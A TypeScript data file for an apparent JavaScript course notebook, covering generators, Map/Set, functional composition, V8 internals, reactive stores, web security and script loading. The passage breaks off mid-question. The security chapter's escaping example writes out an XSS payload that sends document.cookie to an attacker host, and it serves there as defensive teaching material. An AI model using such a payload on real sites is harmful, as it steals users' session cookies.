import { Chapter } from '../types/notebook';

export const JAVASCRIPT_CHAPTERS_PART3: Chapter[] = [
  // CHAPTER 25 — ITERATORS & GENERATORS
  {
    id: 'js-ch25',
    number: 25,
    title: 'Iterators, Generators & Lazy Evaluation',
    description: 'Iterable protocol, Symbol.iterator, generator functions (function*), yield, and infinite streams',
    topics: [
      {
        id: 'js-iterators-generators',
        subjectId: 'js',
        chapterId: 'js-ch25',
        chapterNumber: 25,
        pageNumber: 25,
        title: 'Iterators, Symbol.iterator & Generator Functions (function*)',
        difficulty: 'advanced',
        definition: 'An Iterator is an object with a next() method returning { value, done }. A Generator function (function*) can pause execution with yield and resume on demand, providing lazy evaluation.',
        whyItMatters: 'Generators enable processing massive or infinite datasets with zero memory bloat by computing values on-demand rather than preallocating large arrays in heap memory.',
        syntax: 'function* idGenerator() {\n  let id = 1;\n  while (true) { yield id++; }\n}\nconst gen = idGenerator();\ngen.next().value; // 1',
        explanation: [
          'Iterable Protocol: Any object with a `[Symbol.iterator]()` method returning an iterator is an iterable and works with `for...of`, spread `[...iter]`, and `Array.from()`.',
          '`function*` and `yield`: Invoking a generator function does not run its body immediately; it returns a Generator object. Calling `.next()` advances to the next `yield` statement.',
          'Two-Way Communication: `yield` not only produces values out, but `.next(inboundValue)` can pass data back INTO the running generator.',
          '`yield*`: Delegates iteration to another iterable or generator.'
        ],
        example: {
          language: 'javascript',
          code: `// Infinite lazy Fibonacci stream
function* fibonacci() {
  let [prev, curr] = [0, 1];
  while (true) {
    yield curr;
    [prev, curr] = [curr, prev + curr];
  }
}

// Consuming exactly the first 6 values lazily
const fib = fibonacci();
const firstSix = [];
for (let i = 0; i < 6; i++) {
  firstSix.push(fib.next().value);
}
console.log("Lazy Fibonacci:", firstSix);

// Custom iterable object
const countdown = {
  from: 3,
  *[Symbol.iterator]() {
    for (let i = this.from; i > 0; i--) yield i;
  }
};
console.log("Spread iterable:", [...countdown]);`,
          output: 'Lazy Fibonacci: [1, 1, 2, 3, 5, 8]\nSpread iterable: [3, 2, 1]',
          annotations: [
            { line: 2, label: 'Generator function definition with asterisk', type: 'yellow' },
            { line: 5, label: 'yield pauses execution state indefinitely without blocking thread', type: 'green' },
            { line: 20, label: 'Symbol.iterator makes plain object compatible with spread', type: 'blue' }
          ]
        },
        diagram: {
          type: 'pipeline',
          title: 'Generator Execution & Pause Pipeline',
          subtitle: 'Stepwise Evaluation on Demand with yield',
          elements: [
            { id: '1', label: 'gen.next()', sublabel: 'Caller request', value: 'Resume Generator', status: 'normal', arrowTo: '2' },
            { id: '2', label: 'yield value', sublabel: 'Evaluate single step', value: '{ value, done: false }', status: 'active', arrowTo: '3' },
            { id: '3', label: 'Paused State', sublabel: 'Freezes stack frame', value: 'Idle in Memory', status: 'referenced' }
          ]
        },
        important: 'Never call `[...generator]` on an infinite generator (like a generator with `while(true)`)! Spreading attempts to consume the entire generator into an array, exhausting all system RAM and crashing the browser.',
        commonMistakes: [
          'Calling a generator function and expecting it to execute immediately without calling `.next()`.',
          'Attempting to construct a generator using an arrow function (`const* fn = () => ...` is invalid syntax).'
        ],
        tip: 'Use generators for complex multi-step wizards or paginated API fetchers that yield pages of records lazily.',
        interviewNote: 'Question: "What protocol makes an object iterable in JavaScript?" Answer: "The Iterable Protocol: the object must implement a method under the Symbol.iterator key that returns an iterator object with a next() method returning { value, done }."',
        practiceQuestions: [
          {
            id: 'q-js25-1',
            type: 'output',
            question: 'What is logged by calling next() on this generator?',
            codeSnippet: 'function* numbers() {\n  yield 10;\n  yield 20;\n  return 30;\n}\nconst g = numbers();\ng.next();\nconsole.log(g.next().value);',
            options: ['10', '20', '30', 'undefined'],
            correctIndex: 1,
            explanation: 'The first next() returns { value: 10, done: false }. The second next() returns { value: 20, done: false }, logging 20.'
          },
          {
            id: 'q-js25-2',
            type: 'mcq',
            question: 'Can arrow functions be used as generator functions (function*)?',
            options: ['Yes, always', 'No, arrow function syntax does not support generators', 'Only in strict mode', 'Only inside classes'],
            correctIndex: 1,
            explanation: 'Arrow functions cannot be generators; the * syntax only applies to standard function declarations, expressions, and class methods.'
          }
        ],
        relatedTopics: ['Loops & Iteration', 'Map, Set & Data Structures', 'Async / Await']
      }
    ]
  },

  // CHAPTER 26 — MAP, SET & ADVANCED DATA STRUCTURES
  {
    id: 'js-ch26',
    number: 26,
    title: 'Map, Set & Advanced Data Structures',
    description: 'Map vs Object, Set vs Array, WeakMap, WeakSet, TypedArrays, and ArrayBuffer',
    topics: [
      {
        id: 'js-map-set',
        subjectId: 'js',
        chapterId: 'js-ch26',
        chapterNumber: 26,
        pageNumber: 26,
        title: 'Map & Set vs Object & Array: WeakMap and Garbage Collection',
        difficulty: 'intermediate',
        definition: 'Map is a hash map supporting any key type (including objects/functions). Set is a collection of unique values. WeakMap and WeakSet hold weak references that do not prevent garbage collection.',
        whyItMatters: 'Objects only allow string or symbol keys; Maps allow DOM elements or objects as keys. Sets provide instant O(1) deduplication and membership checks.',
        syntax: 'const map = new Map(); map.set(keyObj, "value");\nconst unique = new Set([1, 2, 2, 3]); // Set { 1, 2, 3 }\nconst weak = new WeakMap(); // Keys must be objects, GC-friendly',
        explanation: [
          'Map vs Object: Map keys can be any type; Map remembers insertion order; Map has `.size` property; Map performs better in scenarios with frequent additions and removals.',
          'Set vs Array: Set stores strictly unique values using `SameValueZero` equality (handling NaN properly). `new Set(arr)` dedupes in O(N) time.',
          'WeakMap & WeakSet: Keys MUST be objects. Values can be garbage-collected if the object key has no other live references elsewhere in code. Not iterable (no `.size` or `.keys()`). Ideal for private metadata on DOM nodes.'
        ],
        example: {
          language: 'javascript',
          code: `// Array deduplication via Set
const duplicates = [1, 2, 2, 3, 4, 4, 4, 5];
const uniqueArray = [...new Set(duplicates)];
console.log("Unique:", uniqueArray);

// Map with DOM element or object keys
const cache = new Map();
const userA = { id: 101, name: "Maria" };
cache.set(userA, { permissions: ["admin", "editor"] });

console.log("Permissions:", cache.get(userA).permissions);
console.log("Map size:", cache.size);`,
          output: 'Unique: [1, 2, 3, 4, 5]\nPermissions: ["admin", "editor"]\nMap size: 1',
          annotations: [
            { line: 3, label: 'One-line O(N) array deduplication pattern', type: 'green' },
            { line: 8, label: 'Using entire object reference as map lookup key', type: 'blue' }
          ]
        },
        diagram: {
          type: 'tree',
          title: 'Map vs Object & Strong vs Weak References',
          subtitle: 'Preventing Memory Leaks with WeakMap Metadata Attachments',
          elements: [
            { id: '1', label: 'Key-Value Stores', value: 'JavaScript Collections', status: 'normal', arrowTo: '2' },
            { id: '2', label: 'Map', sublabel: 'Any Key Type, Iterable, Size', value: 'Strong Reference (Keeps Key Alive)', status: 'active', arrowTo: '3' },
            { id: '3', label: 'WeakMap', sublabel: 'Object Keys Only, Non-Iterable', value: 'Weak Reference (Allows GC Collection)', status: 'referenced' }
          ]
        },
        important: 'In a regular `Map`, storing a large object as a key retains that object in memory indefinitely even if all other variables discard it. If you want keys to be automatically garbage collected when unused, use `WeakMap`.',
        commonMistakes: [
          'Attempting to call `.forEach()` or read `.size` on a `WeakMap` or `WeakSet` (they are deliberately non-enumerable to preserve non-deterministic GC semantics).',
          'Assuming `new Set([NaN, NaN])` contains two NaNs (Set uses SameValueZero and treats them as duplicates).'
        ],
        tip: 'Use `Set.prototype.has()` for O(1) membership lookups instead of `array.includes()` which takes O(N) linear time.',
        interviewNote: 'Question: "What is the primary purpose of a WeakMap?" Answer: "A WeakMap allows attaching metadata to an object without preventing that object from being garbage-collected when it is no longer referenced anywhere else, preventing memory leaks (commonly used in DOM event tracking and private class fields polyfills)."',
        practiceQuestions: [
          {
            id: 'q-js26-1',
            type: 'output',
            question: 'What is the length of unique elements produced by new Set([1, "1", 1, true]).size?',
            codeSnippet: 'const s = new Set([1, "1", 1, true]);\nconsole.log(s.size);',
            options: ['2', '3', '4', '1'],
            correctIndex: 1,
            explanation: '1 (number), "1" (string), and true (boolean) are all distinct types and values. The duplicate 1 is discarded, resulting in 3 elements.'
          },
          {
            id: 'q-js26-2',
            type: 'mcq',
            question: 'Which of the following is NOT valid as a key in a WeakMap?',
            options: ['Plain Object {}', 'Array []', 'DOM Element', 'Primitive String "id"'],
            correctIndex: 3,
            explanation: 'WeakMap keys must strictly be non-null objects or non-registered symbols, because primitives cannot be garbage-collected.'
          }
        ],
        relatedTopics: ['Objects', 'V8 Runtime & Engine', 'Functional JavaScript']
      }
    ]
  },

  // CHAPTER 27 — FUNCTIONAL JAVASCRIPT
  {
    id: 'js-ch27',
    number: 27,
    title: 'Functional JavaScript & Composition',
    description: 'Pure functions, side effects, immutability, currying, partial application, and pipe/compose patterns',
    topics: [
      {
        id: 'js-functional',
        subjectId: 'js',
        chapterId: 'js-ch27',
        chapterNumber: 27,
        pageNumber: 27,
        title: 'Pure Functions, Immutability & Function Composition (Pipe/Curry)',
        difficulty: 'advanced',
        definition: 'Functional programming is a paradigm treating computation as the evaluation of mathematical functions, avoiding mutable state, and eliminating side effects.',
        whyItMatters: 'Pure functions are 100% predictable, trivially testable, completely thread-safe, and effortlessly cacheable via memoization.',
        syntax: 'const curry = fn => a => b => fn(a, b);\nconst pipe = (...fns) => x => fns.reduce((v, f) => f(v), x);',
        explanation: [
          'Pure Function Requirements: 1. Deterministic (Same inputs ALWAYS yield identical output), 2. Zero Side Effects (No mutating arguments, no HTTP calls, no console.log, no global modifications).',
          'Currying: Translating a function of multiple arguments into a sequence of unary functions taking one argument at a time.',
          'Function Composition / Piping: Assembling small, specialized pure functions into complex data processing pipelines: `pipe(trim, toLowerCase, sanitize)(input)`.'
        ],
        example: {
          language: 'javascript',
          code: `// Pipe utility composing unary pure functions
const pipe = (...fns) => (initialValue) =>
  fns.reduce((acc, fn) => fn(acc), initialValue);

const cleanText = (str) => str.trim();
const normalizeCasing = (str) => str.toLowerCase();
const removeHyphens = (str) => str.replaceAll("-", " ");
const capitalizeWords = (str) =>
  str.replace(/\\b\\w/g, (char) => char.toUpperCase());

// Composed transformation pipeline
const sanitizeSlug = pipe(
  cleanText,
  normalizeCasing,
  removeHyphens,
  capitalizeWords
);

console.log(sanitizeSlug("  JAVASCRIPT-EVENT-LOOP-GUIDE  "));`,
          output: 'Javascript Event Loop Guide',
          annotations: [
            { line: 2, label: 'pipe composes functions left-to-right via reduce', type: 'blue' },
            { line: 12, label: 'Declarative pipeline reads like an assembly line', type: 'green' }
          ]
        },
        diagram: {
          type: 'pipeline',
          title: 'Functional Pipe Composition Pipeline',
          subtitle: 'Data Flowing Unidirectionally Through Pure Transformations',
          elements: [
            { id: '1', label: 'Input Data', value: '" JAVASCRIPT-GUIDE "', status: 'normal', arrowTo: '2' },
            { id: '2', label: 'cleanText', sublabel: 'Pure Function 1', value: '"JAVASCRIPT-GUIDE"', status: 'active', arrowTo: '3' },
            { id: '3', label: 'removeHyphens', sublabel: 'Pure Function 2', value: '"JAVASCRIPT GUIDE"', status: 'active', arrowTo: '4' },
            { id: '4', label: 'capitalizeWords', sublabel: 'Pure Function 3', value: '"Javascript Guide"', status: 'referenced' }
          ]
        },
        important: 'A pure function must NEVER mutate its input parameters! For example, `function addItem(arr, item) { arr.push(item); return arr; }` is IMPURE because it mutates the caller array. Write `return [...arr, item];`.',
        commonMistakes: [
          'Calling `Math.random()` or `Date.now()` inside a function expected to be pure (they break determinism).',
          'Confusing function composition (`compose(f, g) = f(g(x))`) with piping (`pipe(f, g) = g(f(x))`).'
        ],
        tip: 'Pure functions can be memoized using a simple `Map` cache to deliver O(1) instant responses on repeated expensive computations.',
        interviewNote: 'Question: "What is currying in JavaScript?" Answer: "Currying is a technique of translating the evaluation of a function that takes multiple arguments into evaluating a sequence of functions, each with a single argument: f(a, b, c) -> f(a)(b)(c)."',
        practiceQuestions: [
          {
            id: 'q-js27-1',
            type: 'mcq',
            question: 'Which of the following functions is strictly pure?',
            options: [
              'function add(a, b) { console.log(a); return a + b; }',
              'function add(a, b) { return a + b; }',
              'function add(a, b) { return a + b + Math.random(); }',
              'function add(arr, val) { arr.push(val); return arr; }'
            ],
            correctIndex: 1,
            explanation: 'function add(a, b) { return a + b; } is deterministic, relies only on its arguments, and produces no observable side effects.'
          },
          {
            id: 'q-js27-2',
            type: 'output',
            question: 'What is returned by this curried function call?',
            codeSnippet: 'const multiply = (x) => (y) => x * y;\nconst double = multiply(2);\nconsole.log(double(7));',
            options: ['14', 'NaN', 'function', 'undefined'],
            correctIndex: 0,
            explanation: 'multiply(2) returns an inner closure with x = 2. Calling double(7) computes 2 * 7 = 14.'
          }
        ],
        relatedTopics: ['Functions', 'Arrays', 'Design Patterns']
      }
    ]
  },

  // CHAPTER 28 — JAVASCRIPT RUNTIME & ENGINE
  {
    id: 'js-ch28',
    number: 28,
    title: 'JavaScript Runtime & V8 Engine Internals',
    description: 'Lexical parsing, AST, Ignition bytecode, TurboFan JIT, Memory Heap, Garbage Collection, and leaks',
    topics: [
      {
        id: 'js-v8-internals',
        subjectId: 'js',
        chapterId: 'js-ch28',
        chapterNumber: 28,
        pageNumber: 28,
        title: 'V8 Engine Internals: AST, Ignition, TurboFan & Mark-and-Sweep GC',
        difficulty: 'advanced',
        definition: 'Google V8 is an open-source high-performance JavaScript engine written in C++ that compiles JavaScript directly to native machine code using an interpreter (Ignition) and JIT compiler (TurboFan).',
        whyItMatters: 'Understanding memory allocation, hidden classes (shapes), and garbage collector cycles empowers developers to optimize high-throughput node servers and 60fps web apps.',
        syntax: '// Deoptimization prevention: Keep object shapes consistent\nfunction Point(x, y) {\n  this.x = x;\n  this.y = y; // Avoid dynamically deleting or reordering keys\n}',
        explanation: [
          'V8 Compilation Pipeline: 1. Scanner & Parser generates the Abstract Syntax Tree (AST), 2. Ignition bytecode interpreter executes quickly with low memory, 3. TurboFan JIT compiles hot functions into optimized native assembly.',
          'Deoptimization (Bailout): If an optimized function receives unexpected types (e.g. string instead of integer), TurboFan de-optimizes back to Ignition bytecode.',
          'Memory Management: Stack (fast, fixed-size primitive storage & execution frames) vs Heap (unstructured dynamic memory for objects & arrays).',
          'Garbage Collection (Generational Mark-and-Sweep): Memory is divided into Young Generation (Scavenge collector) and Old Generation (Major Mark-Sweep-Compact).'
        ],
        example: {
          language: 'javascript',
          code: `// Monomorphic vs Polymorphic V8 Optimization Pattern
class Order {
  constructor(id, amount) {
    this.id = id;
    this.amount = amount; // Consistent shape / hidden class
  }
}

// TurboFan optimizes this function because argument shapes match
function calculateTax(order) {
  return order.amount * 0.08;
}

const o1 = new Order(1, 100);
const o2 = new Order(2, 250);
console.log("Tax 1:", calculateTax(o1));
console.log("Tax 2:", calculateTax(o2));`,
          output: 'Tax 1: 8\nTax 2: 20',
          annotations: [
            { line: 3, label: 'Initializing properties in identical order creates stable hidden classes', type: 'green' },
            { line: 10, label: 'TurboFan inlines monomorphic property access at machine-code speed', type: 'blue' }
          ]
        },
        diagram: {
          type: 'pipeline',
          title: 'Google V8 Engine Internal Architecture',
          subtitle: 'Source Code → AST → Ignition Bytecode → TurboFan Machine Code',
          elements: [
            { id: '1', label: 'JavaScript Source', value: 'Source Code Text', status: 'normal', arrowTo: '2' },
            { id: '2', label: 'Parser & AST', sublabel: 'Syntax Validation', value: 'Abstract Syntax Tree', status: 'active', arrowTo: '3' },
            { id: '3', label: 'Ignition Interpreter', sublabel: 'Executes Immediately', value: 'V8 Bytecode', status: 'active', arrowTo: '4' },
            { id: '4', label: 'TurboFan Optimizer', sublabel: 'JIT Profiler (Hot Code)', value: 'Native x86/ARM Machine Code', status: 'referenced' }
          ]
        },
        important: 'Common memory leak causes in JavaScript: 1. Accidental global variables (`x = 10`), 2. Forgotten `setInterval` timers, 3. Detached DOM elements held in memory caches, 4. Uncleared event listeners.',
        commonMistakes: [
          'Deleting properties (`delete obj.prop`) which breaks V8 hidden classes and forces dictionary lookup mode.',
          'Adding properties to objects in different orders, creating multiple diverging hidden classes.'
        ],
        tip: 'Always profile memory usage in Chrome DevTools using the "Memory" tab and Heap Snapshots to inspect retained objects and memory leaks.',
        interviewNote: 'Question: "How does the V8 Garbage Collector work?" Answer: "V8 uses a Generational Garbage Collector. New objects are allocated in the Young Generation and collected quickly using Scavenge. Surviving long-lived objects are promoted to Old Generation and collected using Mark-Sweep-Compact to prevent fragmentation."',
        practiceQuestions: [
          {
            id: 'q-js28-1',
            type: 'mcq',
            question: 'Which component of the Google V8 engine is responsible for generating optimized native machine code for hot execution loops?',
            options: ['Ignition', 'TurboFan', 'Blink', 'V8 Scavenger'],
            correctIndex: 1,
            explanation: 'TurboFan is V8’s optimizing Just-In-Time (JIT) compiler, translating profiled bytecode into fast native machine code.'
          },
          {
            id: 'q-js28-2',
            type: 'mcq',
            question: 'Which garbage collection strategy does the JavaScript engine primarily use for the old memory generation?',
            options: ['Reference Counting', 'Mark-Sweep-Compact', 'Manual malloc/free', 'Stop-the-World Compaction only'],
            correctIndex: 1,
            explanation: 'V8 employs Mark-Sweep-Compact for the Old Generation to trace reachable objects from root references and defragment heap space.'
          }
        ],
        relatedTopics: ['Foundations & V8 Architecture', 'Scope & Execution Context', 'Security & Best Practices']
      }
    ]
  },

  // CHAPTER 29 — WEB STORAGE & STATE
  {
    id: 'js-ch29',
    number: 29,
    title: 'Web Storage & Client State Management',
    description: 'State machines, pub/sub event emitters, persistent state, reactivity, and synchronization',
    topics: [
      {
        id: 'js-state-management',
        subjectId: 'js',
        chapterId: 'js-ch29',
        chapterNumber: 29,
        pageNumber: 29,
        title: 'State Architecture: Pub/Sub Event Emitters & Reactive Store Pattern',
        difficulty: 'advanced',
        definition: 'State management coordinates data changes across application views. The Pub/Sub (Publish/Subscribe) pattern decouples state mutations from UI subscribers.',
        whyItMatters: 'Understanding custom reactive stores and pub/sub architecture builds intuition for Redux, Zustand, Vue Reactivity, and native web components.',
        syntax: 'class Store {\n  state = {};\n  listeners = new Set();\n  setState(updates) { Object.assign(this.state, updates); this.notify(); }\n}',
        explanation: [
          'State Hierarchy: Local Component State (ephemeral UI state like dropdown open/closed), Shared App State (authenticated user, cart), Persistent State (localStorage).',
          'Pub/Sub Pattern: Subscribers register listener callbacks; when state changes, the store broadcasts updates without knowing the identity of UI subscribers.',
          'Proxy-Based Reactivity: ES6 `Proxy` intercepts get/set operations on state objects, triggering re-renders automatically when properties are modified.'
        ],
        example: {
          language: 'javascript',
          code: `// Lightweight reactive Store implementation using Pub/Sub
class ReactiveStore {
  constructor(initialState) {
    this.subscribers = new Set();
    this.state = new Proxy(initialState, {
      set: (target, key, value) => {
        target[key] = value;
        this.notify(key, value);
        return true;
      }
    });
  }

  subscribe(listener) {
    this.subscribers.add(listener);
    return () => this.subscribers.delete(listener); // Unsubscribe
  }

  notify(key, value) {
    this.subscribers.forEach(cb => cb(this.state, key, value));
  }
}

const store = new ReactiveStore({ count: 0 });
const unsubscribe = store.subscribe((state, key) => {
  console.log("State Changed -> " + key + ": " + state[key]);
});

store.state.count = 1;
store.state.count = 2;
unsubscribe();
store.state.count = 3; // Ignored by listener`,
          output: 'State Changed -> count: 1\nState Changed -> count: 2',
          annotations: [
            { line: 5, label: 'ES6 Proxy intercepts property mutations automatically', type: 'blue' },
            { line: 15, label: 'Returns cleanup unsubscription function', type: 'green' }
          ]
        },
        diagram: {
          type: 'pipeline',
          title: 'Reactive Pub/Sub State Pipeline',
          subtitle: 'Action Mutation → Proxy Interception → Subscriber UI Notification',
          elements: [
            { id: '1', label: 'Action / User Event', value: 'state.count = 1', status: 'normal', arrowTo: '2' },
            { id: '2', label: 'Proxy set() Trap', sublabel: 'Intercepts Mutation', value: 'target[key] = value', status: 'active', arrowTo: '3' },
            { id: '3', label: 'Pub/Sub Broadcast', sublabel: 'Notify Listeners', value: 'listeners.forEach(cb)', status: 'active', arrowTo: '4' },
            { id: '4', label: 'Subscribed UI Views', sublabel: 'Re-render Components', value: 'Updated DOM Output', status: 'referenced' }
          ]
        },
        important: 'Always provide an unsubscription mechanism for store listeners! Forgetting to unsubscribe components when they unmount causes memory leaks and zombie update calls.',
        commonMistakes: [
          'Directly mutating deeply nested state without notifying subscribers if only shallow proxies are implemented.',
          'Storing derived state that can easily be computed on the fly, leading to out-of-sync state bugs.'
        ],
        tip: 'Keep application state minimal and compute derived values dynamically via getters: `get totalPrice() { return this.items.reduce(...); }`.',
        interviewNote: 'Question: "What is the difference between Pub/Sub and the Observer pattern?" Answer: "In the Observer pattern, the Subject maintains a direct list of observers and notifies them directly. In Pub/Sub, an intermediary broker/topic channel completely decouples publishers and subscribers so they never know about each other."',
        practiceQuestions: [
          {
            id: 'q-js29-1',
            type: 'mcq',
            question: 'Which ES6 feature enables transparent interception of property reads, writes, and deletions on an object?',
            options: ['Object.freeze()', 'Proxy & Reflect', 'Symbol.iterator', 'Generator functions'],
            correctIndex: 1,
            explanation: 'The ES6 Proxy object allows wrapping a target object to define custom trap handlers for fundamental operations like property lookup and assignment.'
          },
          {
            id: 'q-js29-2',
            type: 'output',
            question: 'What is returned by the subscribe helper in idiomatic Pub/Sub designs?',
            options: ['The entire state object', 'An unsubscribe cleanup function', 'A Promise', 'Boolean true'],
            correctIndex: 1,
            explanation: 'Returning an unsubscribe closure gives subscribers a safe, self-contained way to remove their listener and prevent memory leaks.'
          }
        ],
        relatedTopics: ['Browser APIs', 'Objects', 'JavaScript Projects']
      }
    ]
  },

  // CHAPTER 30 — SECURITY & BEST PRACTICES
  {
    id: 'js-ch30',
    number: 30,
    title: 'Security & Defensive Best Practices',
    description: 'XSS, CSRF, DOM sanitization, avoiding innerHTML, CORS, token storage, and secure API integration',
    topics: [
      {
        id: 'js-security',
        subjectId: 'js',
        chapterId: 'js-ch30',
        chapterNumber: 30,
        pageNumber: 30,
        title: 'Web Application Security: XSS Prevention, CSRF & Content Security Policy',
        difficulty: 'advanced',
        definition: 'Web security encompasses strategies and engineering patterns protecting client applications from Cross-Site Scripting (XSS), Cross-Site Request Forgery (CSRF), and unauthorized data exfiltration.',
        whyItMatters: 'A single XSS vulnerability allows malicious actors to steal user credentials, session cookies, and execute unauthorized actions with the victim\'s full privileges.',
        syntax: '// Safe text insertion preventing XSS\nelement.textContent = untrustedInput;\n// Sanitize if HTML parsing is mandatory (e.g. DOMPurify)\nelement.innerHTML = DOMPurify.sanitize(untrustedInput);',
        explanation: [
          'Cross-Site Scripting (XSS): Malicious JavaScript injected into the application. Stored XSS (in database), Reflected XSS (in URL params), DOM-based XSS (unsafe DOM sinks like `innerHTML` or `eval()`).',
          'Dangerous Sinks: `innerHTML`, `outerHTML`, `document.write()`, `eval()`, `setTimeout(string)`. Replace with `textContent`, `createElement`, and safe sanitizers.',
          'Cross-Site Request Forgery (CSRF): Trick user browser into submitting unauthorized requests. Mitigate using SameSite=Strict cookies and anti-CSRF tokens.',
          'Content Security Policy (CSP): HTTP response header restricting the sources of executable scripts, stylesheets, and network destinations.'
        ],
        example: {
          language: 'javascript',
          code: `// Defensive HTML Escaper utility
function escapeHtml(unsafeText) {
  return String(unsafeText)
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll('"', "&quot;")
    .replaceAll("'", "&#039;");
}

const userInput = '<script>fetch("https://attacker.com?c=" + document.cookie)</script>';
const safeOutput = escapeHtml(userInput);

console.log("Neutralized Payload:", safeOutput);`,
          output: 'Neutralized Payload: &lt;script&gt;fetch(&quot;https://attacker.com?c=&quot; + document.cookie)&lt;/script&gt;',
          annotations: [
            { line: 4, label: 'Replaces dangerous angle brackets with HTML entities', type: 'green' },
            { line: 12, label: 'Payload rendered as harmless plain text, preventing execution', type: 'blue' }
          ]
        },
        diagram: {
          type: 'pipeline',
          title: 'XSS Attack Vector & Defense Pipeline',
          subtitle: 'Untrusted Payload → DOM Sink Interception → Sanitized Escaping',
          elements: [
            { id: '1', label: 'Untrusted Input', value: '<script>malicious()</script>', status: 'warning', arrowTo: '2' },
            { id: '2', label: 'Dangerous Sink', sublabel: 'innerHTML / eval()', value: 'Vulnerable', status: 'warning', arrowTo: '3' },
            { id: '3', label: 'Defense Layer', sublabel: 'textContent / escapeHtml', value: 'Escaped Entities', status: 'active', arrowTo: '4' },
            { id: '4', label: 'Safe DOM Node', sublabel: 'Rendered as raw text', value: 'Zero Script Execution', status: 'referenced' }
          ]
        },
        important: 'NEVER store sensitive authorization JWT tokens in `localStorage` if your app has any user-generated content! Store tokens in `HttpOnly; Secure; SameSite=Strict` cookies that cannot be accessed by client JavaScript.',
        commonMistakes: [
          'Using `eval()` to parse JSON (leaves application wide open to arbitrary code execution).',
          'Trusting client-side form validation alone without duplicating validation on the backend API.'
        ],
        tip: 'Implement a strict Content-Security-Policy (CSP) header in your server responses: `Content-Security-Policy: default-src \'self\'; script-src \'self\'`.',
        interviewNote: 'Question: "What is Cross-Site Scripting (XSS) and how do you prevent it?" Answer: "XSS occurs when malicious scripts are injected into trusted websites. Prevention: 1. Use textContent instead of innerHTML. 2. Sanitize HTML via DOMPurify. 3. Enforce a strict Content Security Policy (CSP). 4. Store tokens in HttpOnly cookies."',
        practiceQuestions: [
          {
            id: 'q-js30-1',
            type: 'mcq',
            question: 'Which of the following DOM properties represents a dangerous XSS sink when populated with unvalidated user input?',
            options: ['element.textContent', 'element.className', 'element.innerHTML', 'element.id'],
            correctIndex: 2,
            explanation: 'element.innerHTML parses and compiles raw HTML and embedded <script> or event handler attributes, executing injected attacker scripts.'
          },
          {
            id: 'q-js30-2',
            type: 'mcq',
            question: 'What cookie attribute prevents client-side JavaScript from reading cookies via document.cookie?',
            options: ['Secure', 'SameSite=Lax', 'HttpOnly', 'Domain'],
            correctIndex: 2,
            explanation: 'The HttpOnly flag blocks client JavaScript access entirely, guarding sensitive session tokens against XSS exfiltration.'
          }
        ],
        relatedTopics: ['DOM Fundamentals', 'Web Storage & State', 'Fetch & HTTP']
      }
    ]
  },

  // CHAPTER 31 — JAVASCRIPT WITH HTML & CSS
  {
    id: 'js-ch31',
    number: 31,
    title: 'HTML & CSS Integration (Interactive Components)',
    description: 'script defer vs async, modal dialogs, tabs, dropdowns, accordions, and dark theme toggles',
    topics: [
      {
        id: 'js-html-components',
        subjectId: 'js',
        chapterId: 'js-ch31',
        chapterNumber: 31,
        pageNumber: 31,
        title: 'Script Loading (defer vs async) & Accessible UI Components',
        difficulty: 'intermediate',
        definition: 'Integrating JavaScript with semantic HTML and CSS enables interactive web widgets (modals, accordions, theme switchers) with proper accessibility (ARIA) attributes.',
        whyItMatters: 'Using defer ensures scripts download in parallel without blocking HTML parsing, and executing in DOM order only after the document is parsed.',
        syntax: '<script defer src="app.js"></script> <!-- Non-blocking, executes after DOM ready -->\n<script async src="analytics.js"></script> <!-- Executes immediately upon download -->',
        explanation: [
          'Script Loading: `defer` downloads script in parallel with HTML parsing and executes in document order right before `DOMContentLoaded`. `async` downloads in parallel and executes immediately as soon as ready, interrupting HTML parsing.',
          'Accessible Modals: Must manage keyboard focus trap, escape key dismissal, and toggle `aria-hidden` and `aria-modal="true"`.',
          'Theme Toggle: Switch `data-theme="dark"` attribute on document element and persist state in `localStorage`.'
        ],
        example: {
          language: 'javascript',
          code: `// Accessible Theme Switcher with persistence
class ThemeManager {
  static STORAGE_KEY = "codeink_theme_pref";

  static init() {
    const savedTheme = localStorage.getItem(this.STORAGE_KEY) ?? "light";
    this.applyTheme(savedTheme);
  }

  static toggle() {
    const current = document.documentElement.getAttribute("data-theme") ?? "light";
    const next = current === "dark" ? "light" : "dark";
    this.applyTheme(next);
    localStorage.setItem(this.STORAGE_KEY, next);
    return next;
  }

  static applyTheme(theme) {
    document.documentElement.setAttribute("data-theme", theme);
    console.log("Active Theme applied: " + theme);
  }
}

// Initializing theme manager
console.log("ThemeManager initialized with dark/light mode toggle.");`,
          output: 'ThemeManager initialized with dark/light mode toggle.',
          annotations: [
            { line: 5, label: 'Checks localStorage for persisted preference on initial load', type: 'blue' },
            { line: 10, label: 'Applies data-theme attribute on <html> element for CSS selector styling', type: 'green' }
          ]
        },
        diagram: {
          type: 'pipeline',
          title: 'Script Loading Execution Comparison',
          subtitle: 'Normal Script vs async vs defer Loading Timelines',
          elements: [
            { id: '1', label: 'Default <script>', sublabel: 'Pauses HTML parser', value: 'Blocks Parsing (Slow)', status: 'warning', arrowTo: '2' },
            { id: '2', label: '<script async>', sublabel: 'Executes immediately when ready', value: 'Unordered Execution', status: 'normal', arrowTo: '3' },
            { id: '3', label: '<script defer>', sublabel: 'Runs after DOM is completely parsed', value: 'Ordered & Non-Blocking', status: 'active' }
          ]
        },
        important: 'Always use `<script defer>` for your primary application bundles located in the `<head>`! It eliminates page-load render blocking while guaranteeing scripts execute in sequential order.',
        commonMistakes: [
          'Placing heavy un-deferred scripts in the `<head>` of HTML documents, creating white screen render delays.',
          'Building modals that cannot be closed with the Escape key or that lose keyboard tab focus.'
        ],
        tip: 'Use native HTML `<dialog>` element with `.showModal()` and `.close()` for built-in backdrop styling, focus trapping, and escape-key handling.',
        interviewNote: 'Question: "What is the difference between script async and script defer?" Answer: "Both download scripts in the background without blocking HTML parsing. However, async scripts execute immediately once downloaded, pausing HTML parsing and executing out of order. defer scripts execute in exact document order only after the HTML document has finished parsing."',
        practiceQuestions: [
          {
            id: 'q-js31-1',
            type: 'mcq',
            question: 'Which script attribute guarantees scripts execute in exact DOM source order after the HTML document is parsed?',
            options: ['async', 'defer', 'preload', 'modulepreload'],
            correctIndex: 1,
            explanation: 'The defer attribute downloads scripts in parallel and guarantees they will execute in source order only after HTML parsing completes.'
          },
          {
            id: 'q-js31-2',
            type: 'mcq',
            question: 'What is the modern semantic HTML element designed specifically for modal popups and alerts?',
            options: ['<popup>', '<modal>', '<dialog>', '<window>'],
            correctIndex: 2,
